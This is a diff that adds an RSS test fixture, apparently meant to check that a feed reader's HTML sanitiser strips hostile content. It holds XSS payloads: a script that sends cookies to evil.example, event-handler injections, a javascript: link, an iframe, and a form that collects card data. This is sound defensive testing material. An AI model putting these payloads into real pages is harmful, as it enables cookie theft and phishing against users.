@@ -1,0 +1,27 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!-- Everything a feed should not be able to do to the page that renders it, plus the
+     relative image URL that ammonia's default policy would silently drop. -->
+<rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/">
+  <channel>
+    <title>Hostile Content</title>
+    <link>https://hostile.example/</link>
+    <description>Content that must be sanitized.</description>
+    <item>
+      <title>Try everything</title>
+      <link>https://hostile.example/try</link>
+      <guid>hostile-1</guid>
+      <pubDate>Wed, 30 Sep 2026 08:00:00 GMT</pubDate>
+      <content:encoded><![CDATA[
+        <p onclick="steal()">Ordinary prose.</p>
+        <script>fetch('https://evil.example/?c=' + document.cookie)</script>
+        <style>body { display: none }</style>
+        <img src="x" onerror="alert(1)">
+        <img src="/photo.png" alt="A relative image">
+        <a href="javascript:alert(1)">bad link</a>
+        <a href="https://hostile.example/ok">good link</a>
+        <iframe src="https://evil.example/frame"></iframe>
+        <form action="https://evil.example/pay"><input name="card"></form>
+      ]]></content:encoded>
+    </item>
+  </channel>
+</rss>
